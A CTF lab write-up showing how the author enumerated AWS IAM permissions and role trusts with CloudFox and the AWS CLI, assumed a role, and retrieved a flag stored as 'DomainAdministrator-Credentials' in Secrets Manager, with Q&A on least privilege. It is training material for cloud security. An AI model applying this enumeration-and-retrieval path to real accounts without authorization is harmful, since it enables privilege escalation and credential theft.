
# 🔐 CloudFoxable Challenge: Retrieving AWS Secrets Manager Flag

## 🧾 Overview

In this CloudFoxable challenge, the task involved identifying and assuming an AWS IAM role capable of retrieving a specific secret (`DomainAdministrator-Credentials`) from AWS Secrets Manager. This scenario simulated a realistic cloud penetration test, focusing on enumerating permissions, analyzing IAM trust relationships, assuming roles, and retrieving sensitive information (flag).

---

## 🎯 Objectives

Through this challenge, I aimed to:

- Identify IAM roles with permissions to access a specific AWS Secrets Manager secret.
- Analyze IAM trust relationships to understand which users could assume specific roles.
- Inspect IAM policies to confirm detailed permissions explicitly granted.
- Assume a role based on IAM trust policy findings.
- Retrieve the secret (flag) using AWS CLI.

---

## 🚩 Detailed Steps and Expected Outputs

### Step 1: Enumerating Permissions with CloudFox

**Command:**
```bash
cloudfox aws -p cloudfoxable permissions -v2 | grep -i secret
```

**Expected Output (Anonymized AWSACCOUNT):**
```
Role │ Alexander-Arnold │ Allow │ secretsmanager:GetSecretValue │ arn:aws:secretsmanager:us-west-2:AWSACCOUNT:secret:DomainAdministrator-Credentials-xxxxxx
```

### Step 2: Analyzing IAM Trust Relationships

**Command:**
```bash
cloudfox aws -p cloudfoxable role-trusts -v2
```

**Expected Output:**
```
Role: Alexander-Arnold
Trusts: arn:aws:iam::AWSACCOUNT:user/ctf-starting-user
```

### Step 3: Listing Attached IAM Policies

**Command:**
```bash
aws --profile cloudfoxable iam list-attached-role-policies --role-name Alexander-Arnold
```

**Expected Output:**
```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "corporate-domain-admin-password-policy",
      "PolicyArn": "arn:aws:iam::AWSACCOUNT:policy/corporate-domain-admin-password-policy"
    }
  ]
}
```

### Step 4: Retrieving IAM Policy Metadata

**Command:**
```bash
aws --profile cloudfoxable iam get-policy --policy-arn arn:aws:iam::AWSACCOUNT:policy/corporate-domain-admin-password-policy
```

**Expected Output:**
```json
{
  "Policy": {
    "PolicyName": "corporate-domain-admin-password-policy",
    "Arn": "arn:aws:iam::AWSACCOUNT:policy/corporate-domain-admin-password-policy",
    "DefaultVersionId": "v1",
    "AttachmentCount": 1,
    "IsAttachable": true,
    "CreateDate": "2025-03-05T22:48:54+00:00",
    "UpdateDate": "2025-03-05T22:48:54+00:00"
  }
}
```

### Step 5: Inspecting IAM Policy Permissions

**Command:**
```bash
aws --profile cloudfoxable iam get-policy-version \
  --policy-arn arn:aws:iam::AWSACCOUNT:policy/corporate-domain-admin-password-policy \
  --version-id v1
```

**Expected Output:**
```json
{
  "PolicyVersion": {
    "Document": {
      "Statement": [
        {
          "Action": ["secretsmanager:GetSecretValue"],
          "Effect": "Allow",
          "Resource": [
            "arn:aws:secretsmanager:us-west-2:AWSACCOUNT:secret:DomainAdministrator-Credentials-xxxxxx"
          ]
        }
      ],
      "Version": "2012-10-17"
    },
    "VersionId": "v1",
    "IsDefaultVersion": true,
    "CreateDate": "2025-03-05T22:48:54+00:00"
  }
}
```

### Step 6: Assuming Role & Retrieving the Secret (Flag)

**Command:**
```bash
aws --profile Alexander-Arnold secretsmanager get-secret-value \
  --secret-id arn:aws:secretsmanager:us-west-2:AWSACCOUNT:secret:DomainAdministrator-Credentials-xxxxxx \
  --region us-west-2
```

**Expected Output (Flag):**
```json
{
  "ARN": "arn:aws:secretsmanager:us-west-2:AWSACCOUNT:secret:DomainAdministrator-Credentials-qc9Cvn",
    "Name": "DomainAdministrator-Credentials",
    "VersionId": "744ABAF0-0338-4ADD-99A5-A98DC465B202",
    "SecretString": "FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-03-05T17:48:53.890000-05:00"
}
```

---

## ❓ Challenge Questions & Answers

**Q1:** Why did I need to inspect both permissions and IAM role trust policies?  
**A:** To ensure I identified not only which role could access the secret but also whether my IAM user had permission (trust) to assume that role.

**Q2:** What risk arises if an IAM role trust policy is overly permissive?  
**A:** Overly permissive trust policies can lead to privilege escalation, allowing unintended users or roles to assume high-privileged roles, potentially compromising sensitive data or resources.

**Q3:** Why is it essential to explicitly specify resources in IAM policies?  
**A:** Explicit resource definitions prevent unintended access, reducing security risks and adhering to the principle of least privilege.

**Q4:** Can a user assume a role without having explicit `sts:AssumeRole` permissions in their IAM policy?  
**A:** Yes. If a user's ARN is explicitly included as a trusted principal in the role's trust policy, they can assume the role without explicit `sts:AssumeRole` permission.

**Q5:** How does CloudFox support effective cloud security enumeration and analysis?  
**A:** CloudFox automates the enumeration and visualization of IAM permissions, trust relationships, and potential misconfigurations, significantly improving cloud security visibility and identifying privilege escalation paths quickly.

---

## 🎓 What I Learned

Through this challenge, I learned:

- How to effectively enumerate AWS permissions and trust relationships using CloudFox.
- The importance of clearly defined IAM permissions and trust policies in AWS security.
- Practical AWS CLI commands for analyzing IAM roles, policies, and retrieving secrets.
- The real-world implications of IAM misconfigurations and the importance of the least privilege principle.

---

## Conclusion

This CloudFoxable challenge provided a practical, hands-on opportunity to explore AWS IAM permissions and trust relationships, demonstrating realistic cloud security enumeration, privilege escalation, and secret retrieval processes. I significantly strengthened my AWS security and IAM skills, essential for cloud security professionals and penetration testers.

---

### 📚 References & Tools

- **CloudFox:** [https://github.com/BishopFox/cloudfox](https://github.com/BishopFox/cloudfox)
- **AWS CLI IAM Documentation:** [AWS IAM CLI](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html)
- **AWS Secrets Manager CLI:** [AWS Secrets Manager CLI](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/secretsmanager/index.html)

---

*Prepared by: Ashish Gurau*  
*Cloud Security & IAM Enumeration Walkthrough*
